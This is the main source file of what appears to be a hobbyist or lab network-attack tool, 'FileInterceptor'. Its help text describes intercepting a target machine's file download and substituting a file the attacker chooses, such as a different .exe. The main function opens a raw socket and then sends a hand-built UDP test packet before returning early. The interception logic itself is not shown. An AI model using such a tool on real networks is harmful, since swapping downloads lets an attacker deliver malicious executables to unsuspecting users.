#include "FileInterceptor.h"

#include <iostream>

#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>

#define DOWNLOAD_LINK_STR_SIZE  512

void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <target ip> <download link> <new download link>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<target ip>: target whose file you wish to intercept\n"
        << "<download link>: file you wish to replace\n"
        << "<new download link>: the path to the file you want the target to download\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " download.example.co/testfile.exe" << "10.0.2.15/test_program.exe" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink, char* newDownloadLink)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 6)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[3]);
    PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[4]);
    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    char targetIPStr[INET6_ADDRSTRLEN]{};
    char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    } 

    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    //
    while(true)
    {
        /*
        PacketCraft::Packet testPacket;
        testPacket.Receive(socketFd, 0);
        if(testPacket.FindLayerByType(PC_UDP) != nullptr)
        {
            testPacket.Print();
            testPacket.CalculateChecksums();
            testPacket.Print();
            close(socketFd);
            return 0;
        }
        */
        sockaddr_in targetIP{};
        inet_pton(AF_INET, targetIPStr, &targetIP.sin_addr);
        
        PacketCraft::Packet testPacket2;
        testPacket2.AddLayer(PC_ETHER_II, ETH_HLEN);
        EthHeader* ethHeader = (EthHeader*)testPacket2.GetLayerStart(0);

        PacketCraft::GetTargetMACAddr(socketFd, interfaceName, targetIP, *(ether_addr*)ethHeader->ether_dhost);
        PacketCraft::GetMACAddr(*(ether_addr*)ethHeader->ether_shost, interfaceName, socketFd);
        ethHeader->ether_type = htons(ETH_P_IP);

        sockaddr_in ipSrc{};
        inet_pton(AF_INET, "10.0.2.9", &ipSrc.sin_addr);
        sockaddr_in ipDst{};
        inet_pton(AF_INET, "10.0.2.15", &ipDst.sin_addr);

        const char* msg = "Hi this is a random vitun testi";

        testPacket2.AddLayer(PC_IPV4, sizeof(IPv4Header));
        IPv4Header* ipv4Header = (IPv4Header*)testPacket2.GetLayerStart(1);
        ipv4Header->ip_v = 4;
        ipv4Header->ip_hl = 5;
        ipv4Header->ip_tos = 0;
        ipv4Header->ip_id = htons(1);
        ipv4Header->ip_off = htons(IP_DF);
        ipv4Header->ip_ttl = 64;
        ipv4Header->ip_p = 17;
        ipv4Header->ip_sum = htons(0);
        ipv4Header->ip_len = htons(20 + PacketCraft::GetStrLen(msg) + sizeof(UDPHeader));
        memcpy(&ipv4Header->ip_src.s_addr, &ipSrc.sin_addr.s_addr, IPV4_ALEN);
        memcpy(&ipv4Header->ip_dst.s_addr, &ipDst.sin_addr.s_addr, IPV4_ALEN);

        testPacket2.AddLayer(PC_UDP, sizeof(UDPHeader) + PacketCraft::GetStrLen(msg));
        UDPHeader* udpHeader = (UDPHeader*)testPacket2.GetLayerStart(2);
        udpHeader->source = htons(20);
        udpHeader->dest = htons(10);
        udpHeader->len = htons(8 + PacketCraft::GetStrLen(msg));
        udpHeader->check = htons(0);
        memcpy(udpHeader->data, msg, PacketCraft::GetStrLen(msg));

        testPacket2.Print();
        testPacket2.CalculateChecksums();
        testPacket2.Print();

        testPacket2.Send(socketFd, interfaceName, 0);

        return 0;
    }   
    //


    CHaks::FileInterceptor fileInterceptor;
    if(fileInterceptor.Run(socketFd, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        close(socketFd);
        return APPLICATION_ERROR;
    }

    close(socketFd);
    return NO_ERROR;    
}